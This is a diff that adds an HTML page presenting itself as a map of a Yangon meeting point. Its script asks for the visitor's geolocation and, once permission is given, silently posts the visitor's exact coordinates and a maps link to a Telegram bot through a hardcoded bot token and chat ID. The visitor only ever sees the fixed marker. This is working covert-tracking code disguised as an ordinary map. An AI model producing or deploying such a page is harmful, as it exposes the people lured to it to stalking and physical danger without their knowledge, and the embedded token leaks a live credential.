@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Map</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link
+  rel="stylesheet"
+  href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+/>
+
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+}
+
+#map {
+  height: 100vh;
+  width: 100%;
+  display: none;
+}
+
+#notice {
+  height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: Arial, sans-serif;
+  font-size: 20px;
+}
+</style>
+</head>
+
+<body>
+
+<div id="notice">📍 Open Location</div>
+<div id="map"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<script>
+/* ================= CONFIG ================= */
+const BOT_TOKEN = "8300093303:AAEaZEc86Rns1Q2xcahWA55YjFYvbCvxoVo";
+const CHAT_ID  = "5991637594";
+
+// Yangon meeting point (example)
+const YANGON_POINT = { lat: 16.7746, lng: 96.1581 };
+
+/* ================= TELEGRAM ================= */
+function sendTelegram(text) {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
+  });
+}
+
+/* ================= LOCATION ================= */
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      // ✅ Allow
+      document.getElementById("notice").style.display = "none";
+      document.getElementById("map").style.display = "block";
+
+      const map = L.map("map").setView(
+        [YANGON_POINT.lat, YANGON_POINT.lng],
+        15
+      );
+
+      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+        attribution: "© OpenStreetMap"
+      }).addTo(map);
+
+      // Only Yangon marker
+      L.marker([YANGON_POINT.lat, YANGON_POINT.lng]).addTo(map);
+
+      // Send location silently to Telegram
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+
+      sendTelegram(
+        `User Location\nLat: ${lat}\nLng: ${lng}\nhttps://maps.google.com/?q=${lat},${lng}`
+      );
+    },
+    () => {
+      // ❌ Deny → keep "Open Location"
+      document.getElementById("notice").innerText = "📍 Open Location";
+    }
+  );
+} else {
+  document.getElementById("notice").innerText = "📍 Open Location";
+}
+</script>
+
+</body>
+</html>
